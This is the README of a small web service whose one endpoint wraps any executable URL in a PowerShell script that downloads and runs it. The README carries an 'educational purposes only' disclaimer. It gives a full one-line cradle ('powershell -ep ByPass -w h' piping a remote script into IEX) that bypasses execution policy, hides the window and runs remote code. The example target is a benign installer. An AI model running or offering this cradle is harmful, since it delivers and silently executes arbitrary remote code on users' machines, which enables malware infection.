This is a server which runs utils for various project

> **Disclaimer** \
> This project shall be used for **educational purposes only** \
> I (the author) take no responsibility or liability related to its usage.
> Any illegal activities are strictly forbidden.

# Endpoints

## [/exe2ps1](https://vercelutilsserver.totallysafe.ch/exe2ps1)

returns a powershell script, which downloads and runs an executable from `param:url` with all `param:arg` passed


example: [`/exe2ps1?url=https://www.python.org/ftp/python/3.12.4/python-3.12.4.exe`](https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe)

which can be executed with 
```shell
powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
```
